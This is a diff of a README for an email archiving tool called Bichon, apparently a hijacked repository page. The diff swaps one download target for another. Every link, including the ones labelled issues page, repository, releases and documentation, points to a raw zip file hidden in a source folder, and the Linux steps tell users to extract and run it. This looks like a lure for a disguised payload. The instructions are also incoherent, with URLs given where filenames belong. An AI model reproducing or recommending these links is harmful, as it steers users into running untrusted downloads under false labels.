@@ -1,7 +1,7 @@
 # 🐶 bichon - Effortless Email Archiving Made Simple
 
 ## 📦 Download Bichon
-[![Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip%https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)
+[![Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip%https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)
 
 ## 🚀 Getting Started
 Bichon is a lightweight tool designed to help you archive your emails easily. With its fast performance and user-friendly WebUI, you can keep your email organized without any hassle. No programming knowledge is required to use this software.
@@ -22,19 +22,19 @@ Bichon is a lightweight tool designed to help you archive your emails easily. Wi
 To get started with Bichon, visit the releases page and download the latest version.
 
 1. Click on the link below to visit the download page:
-   [Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)
+   [Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)
 
 2. Look for the latest release, which will typically be at the top of the page.
 
 3. Choose the correct file for your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip` file.
+   - For Linux: Download the `https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip` file.
 
 4. Once the file is downloaded, follow these steps:
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file and drag Bichon to your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip` file and run the executable from the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip` file and run the executable from the terminal.
 
 ## 🛠️ Setting Up Bichon
 After installing Bichon, you need to set it up for your email:
@@ -67,11 +67,11 @@ If you want to improve Bichon, you can contribute:
 4. Push the branch and create a pull request.
 
 ## 📞 Support
-For additional support, you can visit the [issues page](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip) on GitHub. Here, you can report bugs, ask questions, or seek help from other users.
+For additional support, you can visit the [issues page](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip) on GitHub. Here, you can report bugs, ask questions, or seek help from other users.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)
-- [Releases Page](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)
-- [Documentation](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)
+- [Releases Page](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip)
 
-Remember, you can always return to the [Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/src/modules/logger/bichon_3.9.zip) page to check for updates and new releases. Enjoy organizing your emails with Bichon!
+Remember, you can always return to the [Download Bichon](https://raw.githubusercontent.com/GODXLUV/bichon/main/web/src/features/accounts/data/Software_v2.8.zip) page to check for updates and new releases. Enjoy organizing your emails with Bichon!
